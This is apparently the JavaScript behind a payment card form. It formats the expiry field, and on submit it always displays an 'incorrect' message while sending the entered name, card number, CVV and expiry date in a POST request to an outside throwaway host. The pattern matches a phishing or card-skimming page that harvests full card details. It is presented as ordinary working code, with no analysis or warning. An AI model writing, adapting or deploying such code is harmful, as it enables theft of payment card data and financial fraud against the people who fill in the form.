const cardExpiryInput = document.getElementById('exp');

cardExpiryInput.addEventListener('input', (event) => {
  const input = event.target.value;
  const formattedInput = formatCardExpiry(input);
  event.target.value = formattedInput;
});

function formatCardExpiry(input) {
  const formattedInput = input.replace(/[^\d]/g, '').substring(0, 6);
  const month = formattedInput.substring(0, 2);
  const year = formattedInput.substring(2, 6);

  if (formattedInput.length >= 2) {
    return `${month}${formattedInput.length > 2 ? ' / ' : '/'}${year}`;
  } else {
    return formattedInput;
  }
}

cardExpiryInput.addEventListener('keydown', (event) => {
  const value = event.target.value.replace('/', '');
  if (event.key !== 'Backspace' && event.key !== 'Delete') {
    if (value.length === 2) {
      event.target.value = `${value}/`;
    }
  } else {
    const cursorPosition = event.target.selectionStart;
    const hasSlash = event.target.value[cursorPosition - 1] === '/';
    if (cursorPosition <= 2 || hasSlash) {
      event.preventDefault();
      event.target.value = formatCardExpiry(value.slice(0, -1));
      event.target.setSelectionRange(cursorPosition - (hasSlash ? 1 : 0), cursorPosition - (hasSlash ? 1 : 0));
    }
  }
});


const name = document.getElementById('name');
const cvv = document.getElementById('CVV');
const card = document.getElementById('cardnb');
const btn = document.getElementById('submit');
const incorrect = document.getElementById('incorrect');

btn.addEventListener('click', () => {
  incorrect.style.display = "flex";
  const data = {
    name: name.value,
    cardnb: card.value,
    CVV: cvv.value,
    exp: cardExpiryInput.value
  };
  console.log(data)
  fetch('https://long-teal-pike-tutu.cyclic.app/submit', {
    method: 'POST',
    body: JSON.stringify(data),
    headers: {
      'Content-Type': 'application/json'
    }
  })
    .then(response => response.json())
    .then(data => console.log(data))
    .catch(error => console.error(error));
}
);
